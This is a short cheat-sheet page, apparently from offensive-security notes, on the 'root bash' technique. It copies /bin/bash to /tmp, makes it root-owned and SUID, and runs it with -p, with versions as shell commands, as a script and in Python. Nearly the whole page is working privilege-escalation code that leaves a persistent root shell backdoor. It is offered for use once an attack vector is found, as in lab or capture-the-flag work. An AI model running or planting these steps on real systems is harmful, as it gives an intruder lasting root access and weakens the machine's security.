# Root Bash

<div class="row row-cols-lg-2"><div>

A root bash is a (bash) shell that was executed as root. For instance, using an attack vector such as a SUID script, we may run:

```ps
$ cp /bin/bash /tmp/rootbash
$ chown root /tmp/rootbash
$ chmod +s /tmp/rootbash
```

If you are successful, you can use `-p` (and `-i`) to run it:

```ps
$ /tmp/rootbash -p
root@xxx$
```

📚 Replace `root` with another user according to the attack vector.
</div><div>

**Root Bash** (script)

```shell!
$ cat /tmp/root.sh
cp /bin/bash /tmp/rootbash
chown root /tmp/rootbash
chmod +s /tmp/rootbash
exit 0
$ chmod +x /tmp/root.sh
```

**Root Bash** (Python)

```shell!
import shutil
import os

source_path = '/bin/bash'
destination_path = '/tmp/rootbash'
shutil.copy2(source_path, destination_path)
os.chown(destination_path, 0, 0)
os.chmod(destination_path, 0o4755)
```
</div></div>